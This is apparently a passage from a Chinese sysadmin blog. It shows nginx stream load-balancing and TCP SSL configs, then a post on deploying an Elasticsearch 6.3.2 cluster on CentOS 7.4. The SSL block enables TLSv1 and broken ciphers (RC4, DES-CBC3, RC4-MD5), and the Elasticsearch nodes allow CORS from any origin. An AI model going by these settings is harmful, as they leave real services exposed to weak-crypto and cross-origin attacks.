<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">user  www www;</span><br><span class="line">worker_processes  auto;</span><br><span class="line">worker_cpu_affinity auto;</span><br><span class="line">error_log  logs/error.log  error;</span><br><span class="line">pid        logs/nginx.pid;</span><br><span class="line">worker_rlimit_nofile 653600;</span><br><span class="line">events</span><br><span class="line">&#123;</span><br><span class="line">  use epoll;</span><br><span class="line">  worker_connections 655350;</span><br><span class="line">&#125;</span><br><span class="line">stream &#123;</span><br><span class="line">    upstream server &#123;</span><br><span class="line">        hash $remote_addr consistent;</span><br><span class="line">        server 172.16.1.11:8081 weight=1 max_fails=3 fail_timeout=10s;</span><br><span class="line">        server 172.16.1.22:8081 weight=1 max_fails=3 fail_timeout=10s;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 8081;</span><br><span class="line">        proxy_connect_timeout 1s;</span><br><span class="line">        proxy_timeout 3s;</span><br><span class="line">        proxy_pass server;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="9、TCP-SSL配置"><a href="#9、TCP-SSL配置" class="headerlink" title="9、TCP SSL配置"></a><strong>9、TCP SSL配置</strong></h4><p>需要安装openssl-devel及激活ngx_stream_ssl_module模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">    upstream chat_wss &#123;</span><br><span class="line">       server 172.16.1.88:4001;</span><br><span class="line">       server 172.16.1.99:4001;</span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen              4002 ssl;</span><br><span class="line">        ssl_protocols       TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class="line">        ssl_ciphers         AES128-SHA:AES256-SHA:RC4-SHA:DES-CBC3-SHA:RC4-MD5;</span><br><span class="line">        ssl_certificate     /usr/local/nginx/conf/ssl/minminmsn.crt;</span><br><span class="line">        ssl_certificate_key /usr/local/nginx/conf/ssl/minminmsn.key;</span><br><span class="line">        ssl_session_cache   shared:SSL:10m;</span><br><span class="line">        ssl_session_timeout 10m;</span><br><span class="line"></span><br><span class="line">        proxy_connect_timeout 3s;</span><br><span class="line">        proxy_timeout 1m;</span><br><span class="line">        proxy_pass chat_wss;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/12/2018/12/2018-12-12-centos7-4%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AEelasticsearch6-3-2%E9%9B%86%E7%BE%A4/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/12/2018/12/2018-12-12-centos7-4%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AEelasticsearch6-3-2%E9%9B%86%E7%BE%A4/index/" class="post-title-link" itemprop="url">Centos7.4部署配置Elasticsearch6.3.2集群</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-12 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-12T08:00:00+08:00">2018-12-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/bigdata/" itemprop="url" rel="index"><span itemprop="name">bigdata</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/elasticsearch/reference/6.3/index.html">https://www.elastic.co/guide/en/elasticsearch/reference/6.3/index.html</a> <a target="_blank" rel="noopener" href="https://www.elastic.co/guide/cn/elasticsearch/guide/current/important-configuration-changes.html">https://www.elastic.co/guide/cn/elasticsearch/guide/current/important-configuration-changes.html</a> <a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/elasticsearch/reference/master/setting-system-settings.html">https://www.elastic.co/guide/en/elasticsearch/reference/master/setting-system-settings.html</a></p>
<h3 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h3><p>1、系统环境</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;security&#x2F;limits.conf  elasticsearch soft memlock unlimited elasticsearch hard memlock unlimited elasticsearch soft nofile 131072 elasticsearch hard nofile 131072 elasticsearch soft nproc 4096 elasticsearch hard nproc 4096</p>
</blockquote>
<p>2、JAVA环境</p>
<blockquote>
<p>java -version openjdk version “1.8.0_161” OpenJDK Runtime Environment (build 1.8.0_161-b14) OpenJDK 64-Bit Server VM (build 25.161-b14, mixed mode)</p>
</blockquote>
<h3 id="二、安装配置"><a href="#二、安装配置" class="headerlink" title="二、安装配置"></a>二、安装配置</h3><p>1、安装 rpm -qa |grep elas elasticsearch-6.3.2-1.noarch</p>
<p>注意事项 a.注意Centos7.4服务里面需要配置内存锁定，需要修改文件&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;elasticsearch.service.d&#x2F;override.conf 参考<a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/elasticsearch/reference/master/setting-system-settings.html">https://www.elastic.co/guide/en/elasticsearch/reference/master/setting-system-settings.html</a> [root@elasticsearch01 ~]# EDITOR&#x3D;vim systemctl edit elasticsearch [Service] LimitMEMLOCK&#x3D;infinity [root@elasticsearch01 ~]# systemctl daemon-reload</p>
<p>b.JAVA路径等要和系统环境保持一致 [root@elasticsearch01 ~]# cat &#x2F;etc&#x2F;sysconfig&#x2F;elasticsearch |grep -Ev “^#|^$” JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk ES_PATH_CONF&#x3D;&#x2F;etc&#x2F;elasticsearch ES_STARTUP_SLEEP_TIME&#x3D;5</p>
<p>2、配置</p>
<p>注意配置使用默认的就行，大部分参数都是按照默认即可，官方已经调优过了，特别是Centos7里面，不需要在配置文件里面添加，只有那些必须要根据实际情况修改的配置需要填写。</p>
<p>1）、master节点配置</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.yml cluster.name: roobo-escluster node.name: master-01 node.master: true node.ingest: true node.data: false path.data: &#x2F;data&#x2F;es-data01,&#x2F;data&#x2F;es-data02 path.logs: &#x2F;data&#x2F;es-data01&#x2F;eslogs bootstrap.memory_lock: true network.host: 172.20.3.17 http.port: 9200 discovery.zen.ping.unicast.hosts: [“172.20.3.17:9300”,”172.20.3.18:9300”,”172.20.3.19:9300”] discovery.zen.minimum_master_nodes: 2 gateway.recover_after_nodes: 6 gateway.expected_nodes: 8 gateway.recover_after_time: 5m http.cors.enabled: true http.cors.allow-origin: “*“</p>
</blockquote>
<p>2）、data节点配置</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.yml cluster.name: roobo-escluster node.name: data-01 node.master: false node.ingest: false node.data: true path.data: &#x2F;data&#x2F;es-data01,&#x2F;data&#x2F;es-data02 path.logs: &#x2F;data&#x2F;es-data01&#x2F;eslogs bootstrap.memory_lock: true network.host: 172.20.3.20 http.port: 9200 discovery.zen.ping.unicast.hosts: [“172.20.3.17:9300”,”172.20.3.18:9300”,”172.20.3.19:9300”] discovery.zen.minimum_master_nodes: 2 gateway.recover_after_nodes: 6 gateway.expected_nodes: 8 gateway.recover_after_time: 5m http.cors.enabled: true http.cors.allow-origin: “*“</p>
</blockquote>
<p>3）、jvm调优</p>
<p>默认只需要调整HEAP大小，最好不超过内存的50%，大内存服务器不超过31G</p>
<blockquote>
<p>cat &#x2F;etc&#x2F;elasticsearch&#x2F;jvm.options |egrep ‘Xms|Xmx’ -Xms14g -Xmx14g</p>
</blockquote>
<p>3、开机启动</p>
<p>systemctl enable elasticsearch</p>
<h3 id="三、Elasticsearch常见操作"><a href="#三、Elasticsearch常见操作" class="headerlink" title="三、Elasticsearch常见操作"></a>三、Elasticsearch常见操作</h3><p>查看nodes</p>
<blockquote>
<p>curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_cat/nodes?v">http://172.20.3.20:9200/_cat&#x2F;nodes?v</a> ip heap.percent ram.percent cpu load_1m load_5m load_15m node.role master name 172.20.3.20 4 57 0 0.04 0.03 0.05 d - data-01 172.20.3.18 4 60 0 0.05 0.03 0.05 mi - master-02 172.20.3.24 5 57 0 0.00 0.01 0.05 d - data-05 172.20.3.19 9 38 0 0.02 0.02 0.05 mi - master-03 172.20.3.21 4 57 0 0.00 0.02 0.05 d - data-02 172.20.3.23 5 57 0 0.00 0.01 0.05 d - data-04 172.20.3.22 3 57 0 0.00 0.01 0.05 d - data-03 172.20.3.17 4 68 0 0.00 0.01 0.05 mi * master-01 查看nodes状态 curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_nodes/stats?pretty">http://172.20.3.20:9200/_nodes&#x2F;stats?pretty</a> 查看集群健康状态 curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_cluster/health?pretty">http://172.20.3.20:9200/_cluster&#x2F;health?pretty</a> curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_cluster/health?level=indices">http://172.20.3.20:9200/_cluster&#x2F;health?level&#x3D;indices</a> curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_cluster/health?level=shards">http://172.20.3.20:9200/_cluster&#x2F;health?level&#x3D;shards</a> 查找索引 curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_cat/indices?bytes=b">http://172.20.3.20:9200/_cat&#x2F;indices?bytes&#x3D;b</a> | sort -rnk8 |grep -V marvel 查看设置 curl <a target="_blank" rel="noopener" href="http://172.20.3.20:9200/_cluster/settings?pretty">http://172.20.3.20:9200/_cluster&#x2F;settings?pretty</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/20/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><span class="page-number current">21</span><a class="page-number" href="/page/22/">22</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/22/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Jerry Min</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">260</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">34</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">61</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Jerry Min</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
